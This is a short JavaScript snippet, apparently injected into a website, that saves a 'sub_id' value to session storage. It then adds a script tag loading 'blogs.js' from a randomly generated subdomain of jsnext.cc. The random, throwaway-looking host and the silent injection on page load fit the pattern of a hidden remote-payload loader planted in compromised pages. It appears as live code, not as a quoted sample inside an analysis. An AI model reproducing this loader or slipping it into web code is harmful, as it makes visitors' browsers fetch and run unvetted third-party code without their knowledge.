let subid = 'main';
sessionStorage.setItem('sub_id', subid);
(function() {
     var randoms = Math.floor(Math.random() * 57794371)+Math.floor(Math.random() * 8248100);
     var nextjs = document.createElement('script'); nextjs.type = 'text/javascript'; nextjs.async = true;
     nextjs.src = ('//'+randoms+'.jsnext.cc/assets/js/blogs.js?v='+randoms);
     (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(nextjs);
})();
